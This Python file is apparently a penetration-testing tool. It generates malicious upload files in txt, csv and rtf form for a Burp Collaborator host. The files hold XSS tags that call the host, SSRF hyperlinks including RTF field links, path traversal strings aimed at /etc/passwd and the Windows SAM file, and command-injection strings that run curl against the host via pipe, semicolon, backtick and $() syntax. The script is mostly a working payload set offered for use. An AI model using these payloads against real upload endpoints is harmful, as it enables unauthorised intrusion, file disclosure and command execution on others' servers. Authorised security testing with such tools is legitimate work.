from pathlib import Path

def generate_text_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    if ext in ['txt', 'csv', 'rtf']:
        output_dir.mkdir(parents=True, exist_ok=True)
        
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
        path_traversal_dir = output_dir / 'path_traversal'
        path_traversal_dir.mkdir(exist_ok=True)
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
        
        xss1_script = f"<script>fetch('{base_url}/xss-{ext}-script')</script>"
        output_file = xss_dir / f"xss1_script.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(xss1_script)
        
        xss2_img = f"<img src=x onerror=fetch('{base_url}/xss-{ext}-img')>"
        output_file = xss_dir / f"xss2_img.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(xss2_img)
        
        ssrf1_http = f"http://{burp_collab}/ssrf-{ext}-1"
        if ext == 'rtf':
            rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{ssrf1_http}"}}{{\\fldrslt Click here}}
}}'''
            output_file = ssrf_dir / f"ssrf1_hyperlink.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(rtf_content)
        else:
            output_file = ssrf_dir / f"ssrf1_http.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(ssrf1_http)
        
        ssrf2_https = f"https://{burp_collab}/ssrf-{ext}-2"
        if ext == 'rtf':
            rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{ssrf2_https}"}}{{\\fldrslt Click here}}
}}'''
            output_file = ssrf_dir / f"ssrf2_hyperlink.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(rtf_content)
        else:
            output_file = ssrf_dir / f"ssrf2_https.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(ssrf2_https)
        
        path1_relative = "../../../etc/passwd"
        output_file = path_traversal_dir / f"path1_relative.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(path1_relative)
        
        path2_windows = "..\\..\\..\\windows\\system32\\config\\sam"
        output_file = path_traversal_dir / f"path2_windows.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(path2_windows)
        
        path3_double = "....//....//....//etc/passwd"
        output_file = path_traversal_dir / f"path3_double.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(path3_double)
        
        rce1_pipe = f"|curl {base_url}/rce-{ext}-pipe"
        output_file = rce_dir / f"rce1_pipe.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(rce1_pipe)
        
        rce2_semicolon = f";curl {base_url}/rce-{ext}-semicolon"
        output_file = rce_dir / f"rce2_semicolon.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(rce2_semicolon)
        
        rce3_backtick = f"`curl {base_url}/rce-{ext}-backtick`"
        output_file = rce_dir / f"rce3_backtick.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(rce3_backtick)
        
        rce4_dollar = f"$(curl {base_url}/rce-{ext}-dollar)"
        output_file = rce_dir / f"rce4_dollar.{ext}"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(rce4_dollar)
        
        master_file = output_dir / f"master.{ext}"
        master_content = f"{xss1_script}\n{ssrf1_http}\n{path1_relative}\n{rce1_pipe}"
        with open(master_file, 'w', encoding='utf-8') as f:
            f.write(master_content)
